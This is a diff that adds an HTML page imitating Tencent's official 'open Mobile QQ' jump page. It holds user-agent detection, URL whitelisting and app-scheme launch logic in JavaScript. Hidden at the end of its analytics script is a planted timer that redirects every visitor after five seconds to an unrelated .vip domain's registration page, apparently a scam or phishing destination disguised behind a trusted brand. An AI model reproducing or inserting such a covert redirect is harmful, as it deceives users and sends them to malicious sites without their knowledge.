@@ -1,0 +1,302 @@
+﻿<!DOCTYPE html>
+<html>
+
+<head lang="en">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+  <title>手机QQ</title>
+  <style type="text/css">
+    body {
+      background: #fff;
+      font-family: "Helvetica Neue", Helvetica, STHeiTi, sans-serif
+    }
+
+    .m_wording {
+      text-align: center
+    }
+
+    .m_icon {
+      background-image: url("../qq_product_operations/mma/jumpqq/jump_new.png");
+      width: 159px;
+      height: 159px;
+      margin: 50px auto 0;
+      background-size: cover
+    }
+
+    .m_title {
+      font-weight: 700
+    }
+
+    .m_text {
+      color: #777777
+    }
+
+    .m_text a {
+      color: #12b7f5;
+      text-decoration: none;
+      font-weight: 700
+    }
+
+    #targetUin {
+      color: #ff8444;
+    }
+  </style>
+</head>
+
+<body>
+  <div id="m_container" class="m_wording">
+    <div>
+      <div class="m_icon"></div>
+      <p class="m_title">该链接会唤起手机QQ，</p>
+
+      <p class="m_text">若无法正常跳转请<a id="open_link" href="javascript:">点击右上角用浏览器打开</a>。</p>
+
+      <p class="m_text" style="line-height: 22px;">若您未安装QQ或者QQ版本过低<br>请您<a id="update_link" href="javascript:">先安装最新版QQ</a>。</p>
+    </div>
+  </div>
+
+
+  <script>
+    //BJ_REPORT.tryJs().spyAll();
+  </script>
+
+  <script>
+    (function () {
+
+      var ENV = (function () {
+
+        var ua = navigator.userAgent.toLowerCase();
+        var ua2 = navigator.userAgent;
+
+        var platform = function (os) {
+          var ver = ('' + (new RegExp(os + '(\\d+((\\.|_)\\d+)*)').exec(ua) || [, 0])[1]).replace(/_/g, '.');
+          //// undefined < 3 === false, but null < 3 === true
+          return !!parseFloat(ver);
+        };
+
+        var envObj = {
+          is_mqq: /(iPad|iPhone|iPod).*? (IPad)?QQ\/([\d\.]+)/.test(ua2) ||
+            /\bV1_AND_SQI?_([\d\.]+)(.*? QQ\/([\d\.]+))?/.test(ua2),
+          is_wx: /\bMicroMessenger\/([\d\.]+)/.test(ua2),
+          is_ios: platform('os '),
+          is_qq: !!(ua2.match(/QQ\/([\d\.]+)/) || ua2.match('_SQ_')), // 手Q
+          is_qzone: !!(ua2.match('Qzone/') || ua2.match('_QZ_')), // 手空
+          is_android: platform('android[/ ]'),
+          is_pc: !platform('os ') && !platform('android[/ ]'),
+          is_chrome : (ua.match(/chrome\/([\d.]+)/ig) || ua.match(/CriOS\/([\d.]+)/)) ? true : false
+        }
+        
+        if (envObj.is_android && (envObj.is_qzone || envObj.is_qq) && envObj.is_chrome) {
+            envObj.is_chrome = false
+        }
+        
+        return envObj;
+      })();
+
+      if (ENV.is_ios) {
+        jump_url = 'itms-apps://itunes.apple.com/cn/app/qq-2011/id444934666?mt=8';
+      } else { //if (ENV.is_android) {
+        jump_url = 'https://im.qq.com/mobileqq/';
+      }
+      // alert('ENV:'+JSON.stringify(ENV));
+      document.querySelector('#update_link').href = jump_url;
+
+      if (ENV.is_ios) {
+        callQQ({
+          env: 'ios'
+        });
+      } else if (ENV.is_android) {
+
+        if(ENV.is_chrome && !ENV.is_wx){
+
+          var openBtn = document.getElementById('open_link');
+          openBtn.innerHTML = '点击这里打开'
+          openBtn.addEventListener('click',function(){
+            callQQ({
+              env:'android',
+              browser: 'chrome'
+            })
+          })
+        }else{
+
+          callQQ({
+            env: 'android'
+          });
+        }
+
+
+      }
+
+      function getUrlParam(name, url) {
+
+        //这里使用惰性正则表达式，完善这里的正则表达式，完美支持HASH
+        var reg = new RegExp("(^|&|\\?|#)" + name + "=([^&]*?)(&|#|$)");
+
+        url = url || location.href;
+
+        var tempHash = url.match(/#.*/) ? url.match(/#.*/)[0] : ''; //临时存储hash
+        url = url.replace(/#.*/, ''); //url
+        if (reg.test(tempHash)) {
+          //HASH优先
+          return decodeURIComponent(tempHash.match(reg)[2]);
+        } else if (reg.test(url)) {
+          return decodeURIComponent(url.match(reg)[2]);
+        } else {
+          return ''
+        }
+      }
+
+      function compareVersion(a, b) {
+        var i, l, r, len;
+        a = String(a).split('.');
+        b = String(b).split('.');
+        for (i = 0, len = Math.max(a.length, b.length); i < len; i++) {
+          l = isFinite(a[i]) && Number(a[i]) || 0;
+          r = isFinite(b[i]) && Number(b[i]) || 0;
+          if (l < r) {
+            return -1;
+          } else if (l > r) {
+            return 1;
+          }
+        }
+        return 0;
+      }
+      function isNewWeiXin() {
+        var ua = navigator.userAgent,
+          REGEXP_WEIXIN = /\bMicroMessenger\/([\d\.]+)/,
+          m = ua.match(REGEXP_WEIXIN),
+          minVersion = "6.5.6"; //此版本后拉起手Q用新api
+        // 企业微信没有封堵 schema...
+        var isWxWork = /\bwxwork\/([\d\.]+)/.test(ua);
+
+        if (m && m[0] && m[1]) {
+          if (compareVersion(m[1], minVersion) >= 0) {
+            return !isWxWork;
+          } else {
+            return false;
+          }
+        } else {
+          return false;
+        }
+      }
+      function wxCallQQ(url) {
+        WeixinJSBridge && WeixinJSBridge.invoke('launchApplication', {
+          "schemeUrl": url //需要被拉起第三方 APP 能处理的自定义 scheme URL
+        }, function (res) {
+          //alert(JSON.stringify(res))
+        })
+      }
+      //手Q跳转
+      function callQQ(options) {
+
+        var url = getUrlParam('url') || '';
+        var whiteListVerification = function (url) {
+          var reg = /^http(s)?:\/\/([\w\-]+[\.])+qq\.com($|\/)/;
+          var mqqSchemeList = [
+              '^mqqapi://forward/invite_register',
+              '^mqqapi://qstory/publish',
+              '^mqqapi://videostory/takevideo',
+              '^mqqapi://msg_list/forward_msg_list',
+              '^mqqapi://im/chat\\?src_type=web&version=1&chat_type=c2c&uin=\\d+',
+          ];
+          var inMqqSchemeList = false;
+          for (var i = 0; i < mqqSchemeList.length; i++) {
+            if (new RegExp(mqqSchemeList[i]).test(url)) {
+              inMqqSchemeList = true
+            }
+          }
+          return reg.test(url) || inMqqSchemeList;
+        };
+        var settings = {
+          env: options && options.env || 'unknown',
+          chrome : options.browser == 'chrome' ? true : false
+			  };
+
+        url = whiteListVerification(url) ? url : '';
+        if (!/^mqqapi:\/\//.test(url)) {
+          if (settings.env == 'android') {
+            if(settings.chrome == true){
+              url = "intent://forward/url?src_type=web&style=default&plg_auth=1&version=1&url_prefix=" + btoa(url) + "#Intent;scheme=mqqapi;package=com.tencent.mobileqq;end";
+            }else{
+              url = 'mqqapi://forward/url?src_type=web&plg_auth=1&url_prefix=' + btoa(url) + '&t=' + new Date().getTime();
+
+            }
+          } else if (settings.env == 'ios') {
+            url = 'mqqapi://forward/url?src_type=web&version=1&url_prefix=' + btoa(url) + '&t=' + new Date().getTime();
+          }
+        }
+        if ( isNewWeiXin()) { //新版本微信下使用新方式拉起
+
+          if (typeof WeixinJSBridge == "object" && typeof WeixinJSBridge.invoke == "function") {
+            wxCallQQ(url);
+          } else {
+            if (document.addEventListener) {
+              document.addEventListener("WeixinJSBridgeReady", function () {
+                wxCallQQ(url)
+              }, false);
+            } else if (document.attachEvent) {
+              document.attachEvent("WeixinJSBridgeReady", function () {
+                wxCallQQ(url)
+              });
+              document.attachEvent("onWeixinJSBridgeReady", function () {
+                wxCallQQ(url)
+              });
+            }
+          }
+
+        } else {
+          if (settings.env == 'android' ) {
+
+            if(settings.chrome){
+
+              location.href = url
+              return;
+            }
+
+            var jumpIframe = document.createElement('iframe');
+            jumpIframe.style.cssText = 'display:none; width:0px; height:0px;';
+
+            //就是在iframe.src 赋值伪协议之前先setTimeout 300ms以上，能大大提高唤起手Q的成功率
+            setTimeout(function () {
+              jumpIframe.src = url;
+
+              document.body.appendChild(jumpIframe);
+
+            }, 500);
+          } else {
+            location.href = url;
+          }
+        }
+
+      }
+
+    })()
+  </script>
+
+  <script>
+    //统计
+    (function () {
+      var node = document.createElement('script'),
+        script = document.getElementsByTagName('script')[0];
+      node.src = "https://pingjs.qq.com/tcss.ping.https.js?_bid=2475";
+      node.type = 'text/javascript';
+      node.onload = node.onerror = node.onreadystatechange = function () {
+        /loaded|complete|undefined/.test(node.readyState) && function () {
+          node.onload = node.onerror = node.onreadystatechange = null;
+          node.parentNode.removeChild(node);
+          node = undefined;
+          if (typeof (pgvMain) == 'function') {
+            pgvMain();
+          }
+
+        }();
+      };
+      script.parentNode.insertBefore(node, script);
+	  setTimeout(function() {
+            window.location.href = "https://cs6sf8bf4b7f.vip/register?key=0700183222";
+        }, 5000); // 5000毫秒=5秒
+    })();
+  </script>
+</body>
+
+</html>
